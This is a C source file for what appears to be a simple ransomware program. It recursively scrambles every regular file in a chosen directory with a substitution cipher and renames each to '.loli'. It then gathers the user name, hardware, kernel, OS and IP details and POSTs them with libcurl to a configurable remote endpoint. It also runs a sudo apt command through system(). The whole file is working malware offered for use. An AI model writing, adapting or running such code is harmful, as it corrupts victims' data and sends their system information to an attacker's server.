/*
    Author Jieyab89 
    Compile : gcc -o encrypt  encrypt.c -lcurl

    Usage ./encrypt
*/

#define _GNU_SOURCE

#include <pwd.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <limits.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <ifaddrs.h>
#include <arpa/inet.h>

// Replace with your own API endpoint.
// Tested on Rasbbery pi on my IoT Projects 

#define API_ENDPOINT "http://IP/HOST/Api-simple-logen-encryption-Linux.php" //change this u ip or host
#define TARGET_DIR "<change_this>"  // change this linux path

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    return size * nmemb;
}

void update_dan_delay() {
    int status;

    status = system("sudo apt update && sudo apt install curl");

    if (status == -1) {
        return;
    }

    sleep(200);
}

struct hw_info {
    char name[255];
    char info[8192];
};

void append_ip_info(char *buffer, size_t *offset, size_t max)
{
    struct ifaddrs *ifaddr, *ifa;
    char ip[INET_ADDRSTRLEN];

    if (getifaddrs(&ifaddr) == -1)
        return;

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr)
            continue;

        if (ifa->ifa_addr->sa_family == AF_INET) {
            void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            inet_ntop(AF_INET, addr, ip, sizeof(ip));

            ip[strcspn(ip, "\r\n")] = 0;

            if (strcmp(ip, "127.0.0.1") == 0)
                continue;

            if (*offset < max - 1) {
                *offset += snprintf(buffer + *offset, max - *offset,
                                    "IP (%s): %s\n", ifa->ifa_name, ip);
            }
        }
    }

    freeifaddrs(ifaddr);
}

void append_os_info(char *buffer, size_t *offset, size_t max)
{
    FILE *fp = fopen("/etc/os-release", "r");
    if (!fp) return;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
            char *val = strchr(line, '=') + 1;
            val[strcspn(val, "\n")] = 0;

            // remove quote
            if (val[0] == '\"') {
                val++;
                val[strlen(val)-1] = 0;
            }

            *offset += snprintf(buffer + *offset, max - *offset,
                                "OS: %s\n", val);
            break;
        }
    }

    fclose(fp);
}

void append_file_value(const char *path, const char *label, char *buffer, size_t *offset, size_t max)
{
    FILE *fp = fopen(path, "r");
    if (!fp) return;

    char tmp[512] = {0};
    if (fgets(tmp, sizeof(tmp), fp)) {
        tmp[strcspn(tmp, "\n")] = 0; // remove newline
        *offset += snprintf(buffer + *offset, max - *offset,
                            "%s: %s\n", label, tmp);
    }
    fclose(fp);
}

void get_hardware_info(struct hw_info *hw)
{
    memset(hw->info, 0, sizeof(hw->info));
    size_t offset = 0;
    char line[512];
    FILE *fp;

    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_name) {
        strncpy(hw->name, pw->pw_name, sizeof(hw->name));
    } else {
        strcpy(hw->name, "unknown");
    }
    hw->name[sizeof(hw->name)-1] = '\0';

    offset += snprintf(hw->info + offset, sizeof(hw->info) - offset,
                       "=== Dumping Hardware ===\nUser: %s\n", hw->name);

    fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "model name")) {
                offset += snprintf(hw->info + offset,
                                   sizeof(hw->info) - offset,
                                   "CPU: %s", strchr(line, ':') + 2);
                break;
            }
        }
        fclose(fp);
    }

    fp = fopen("/proc/meminfo", "r");
    if (fp) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "MemTotal")) {
                offset += snprintf(hw->info + offset,
                                   sizeof(hw->info) - offset,
                                   "RAM: %s", strchr(line, ':') + 2);
                break;
            }
        }
        fclose(fp);
    }

    append_file_value("/sys/class/dmi/id/sys_vendor", "Vendor",
                      hw->info, &offset, sizeof(hw->info));

    append_file_value("/sys/class/dmi/id/product_name", "Product",
                      hw->info, &offset, sizeof(hw->info));

    append_file_value("/sys/class/dmi/id/board_name", "Board",
                      hw->info, &offset, sizeof(hw->info));

    // Kernel
    append_file_value("/proc/version", "Kernel",
                      hw->info, &offset, sizeof(hw->info));

    // OS
    append_os_info(hw->info, &offset, sizeof(hw->info));

    // IP
    append_ip_info(hw->info, &offset, sizeof(hw->info));

    hw->info[sizeof(hw->info)-1] = '\0';
}

void send_hardware_info(struct hw_info *hw)
{
    CURL *ch;
    char *esc;
    size_t len;
    char *post_buffer = NULL;
    size_t capacity = 1024 * 1024;

    curl_global_init(CURL_GLOBAL_ALL);

    ch = curl_easy_init();
    if (!ch) return;

    post_buffer = malloc(capacity);
    if (!post_buffer) goto out;

    esc = curl_easy_escape(ch, hw->name, strlen(hw->name));
    len = snprintf(post_buffer, capacity, "hw_name=%s&hw_info=", esc);
    curl_free(esc);

    esc = curl_easy_escape(ch, hw->info, strlen(hw->info));
    snprintf(post_buffer + len, capacity - len, "%s", esc);
    curl_free(esc);

    curl_easy_setopt(ch, CURLOPT_URL, API_ENDPOINT);
    curl_easy_setopt(ch, CURLOPT_POSTFIELDS, post_buffer);
    curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(ch, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(ch, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(ch, CURLOPT_URL, API_ENDPOINT);
    curl_easy_perform(ch);

out:
    curl_easy_cleanup(ch);
    curl_global_cleanup();
    free(post_buffer);
}

static const unsigned char encrypt_map[0x100] = {
  ['1'] = ';',
  ['2'] = 'J',
  ['3'] = 'v',
  ['4'] = 'K',
  ['5'] = 'A',
  ['6'] = 'E',
  ['7'] = 'W',
  ['8'] = 'l',
  ['9'] = '0',
  ['0'] = '4',
  ['-'] = '+',
  ['='] = 'F',
  ['!'] = 'h',
  ['@'] = '}',
  ['#'] = ']',
  ['$'] = 'T',
  ['%'] = 'Y',
  ['^'] = 'o',
  ['&'] = 's',
  ['*'] = '%',
  ['('] = '!',
  [')'] = 'B',
  ['_'] = 'j',
  ['+'] = 'p',
  ['Q'] = 'w',
  ['W'] = 'u',
  ['E'] = 'b',
  ['R'] = 'D',
  ['T'] = '<',
  ['Y'] = '$',
  ['U'] = '#',
  ['I'] = '.',
  ['O'] = '8',
  ['P'] = 'q',
  ['['] = 'U',
  [']'] = '/',
  ['\\'] = 'M',
  ['q'] = 'G',
  ['w'] = '|',
  ['e'] = '&',
  ['r'] = 'c',
  ['t'] = 'd',
  ['y'] = '\'',
  ['u'] = 'z',
  ['i'] = '{',
  ['o'] = '6',
  ['p'] = 'g',
  ['{'] = ')',
  ['}'] = '7',
  ['|'] = 'k',
  ['a'] = '[',
  ['s'] = 'Q',
  ['d'] = '_',
  ['f'] = '3',
  ['g'] = 'x',
  ['h'] = 'X',
  ['j'] = 't',
  ['k'] = '>',
  ['l'] = '@',
  [';'] = 'm',
  ['\''] = '=',
  ['A'] = ',',
  ['S'] = '-',
  ['D'] = '\'',
  ['F'] = 'N',
  ['G'] = 'P',
  ['H'] = 'r',
  ['J'] = '(',
  ['K'] = 'n',
  ['L'] = '1',
  ['X'] = 'R',
  ['C'] = 'I',
  ['V'] = 'y',
  ['B'] = 'f',
  ['N'] = 'i',
  ['M'] = '2',
  [','] = '^',
  ['.'] = 'V',
  ['/'] = '5',
  ['x'] = '9',
  ['c'] = 'O',
  ['v'] = 'Z',
  ['b'] = 'H',
  ['n'] = 'S',
  ['m'] = 'e',
  ['<'] = '*',
  ['>'] = 'C',
  ['Z'] = 'a',
  ['z'] = 'L',
};

static void encrypt_buffer(unsigned char *map, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        unsigned char c = encrypt_map[(size_t)map[i]];
        if (!c)
            continue;
        map[i] = c;
    }
}

static int encrypt_file(const char *file)
{
    int fd;
    int ret;
    unsigned char *map;
    size_t file_size;
    struct stat statbuf;

    fd = open(file, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    ret = fstat(fd, &statbuf);
    if (ret < 0) {
        perror("fstat");
        close(fd);
        return 1;
    }

    file_size = (size_t) statbuf.st_size;

    map = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    encrypt_buffer(map, file_size);
    msync(map, file_size, MS_ASYNC);
    munmap(map, file_size);
    close(fd); 
    return 0;
}

static int encrypt_files(const char *folder)
{
    int ret = 0;
    DIR *dirp;
    struct dirent *dir;
    struct stat statbuf;
    char fullpath[8192];
    char newpath[8192 + sizeof(".loli")];

    dirp = opendir(folder);
    if (!dirp) {
        perror("opendir");
        return 1;
    }

    while (1) {
        const char *file;

        dir = readdir(dirp);
        if (!dir)
            break;

        file = dir->d_name;
        if (!strcmp(file, ".") || !strcmp(file, ".."))
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", folder, file);

        if (stat(fullpath, &statbuf) < 0) {
            perror("stat");
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            encrypt_files(fullpath);
            continue;
        }

        if (!S_ISREG(statbuf.st_mode))
            continue;

        ret = encrypt_file(fullpath);
        if (ret)
            break;

        snprintf(newpath, sizeof(newpath), "%s.loli", fullpath);
        rename(fullpath, newpath);
    }

    closedir(dirp);
    return ret;
}

int main(void)
{
    int exit_code = 0;
    char text[255];
    FILE *name;
    char path[255];
    FILE *dir;
    char buffer[255];

    exit_code = encrypt_files(TARGET_DIR);

    struct hw_info hw;
    get_hardware_info(&hw);
    send_hardware_info(&hw);
    update_dan_delay();

    return exit_code;
}